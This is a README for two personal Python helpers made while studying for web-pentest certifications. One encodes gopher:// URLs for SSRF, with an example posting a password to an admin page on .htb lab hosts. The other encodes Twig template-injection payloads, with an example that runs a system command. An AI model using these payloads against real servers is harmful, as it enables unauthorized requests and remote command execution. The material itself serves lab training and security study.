# CBBH-CWES-Artifact
Some python script I made during the course of preparing for CBBH/CWES

The `gopher-manual.py` is for correctly encode the request to gopher URL scheme to send arbitrary bytes to a TCP socket `(it will automatically encode the URL twice)`.

The `SSTI-payload-encode.py` is for correctly encode the `Twig` payload to make it acceptable to a TCP socket.

Usage:

### 1. Gopeher-manual.py

You may need to manually swap the request inside the `gopher-manual.py`

```shell
┌──(kali㉿kali)-[~]
└─$ python3 gopher-manual.py
gopher://someserver.htb:80/_POST%20/admin.php%20HTTP%2F1.1%0D%0AHost:%20dateserver.htb%0D%0AContent-Length:%2017%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0A%0D%0Apassword%3Dadmin123
gopher%3A//someserver.htb%3A80/_POST%2520/admin.php%2520HTTP%252F1.1%250D%250AHost%3A%2520dateserver.htb%250D%250AContent-Length%3A%252017%250D%250AContent-Type%3A%2520application/x-www-form-urlencoded%250D%250A%250D%250Apassword%253Dadmin123
```

### 2. SSTI-payload-encode.py

You can either `python3 SSTI-payload-encode.py "PAYLOAD"` or `python3 SSTI-payload-encode.py "PAYLOAD" --double` for double encoding.

```shell
┌──(kali㉿kali)-[~]
└─$ python3 SSTI-payload-encode.py "{{ ['ls /'] | filter('system') }}" 
{{%2b['ls%2b/']%2b%7c%2bfilter('system')%2b}}
```
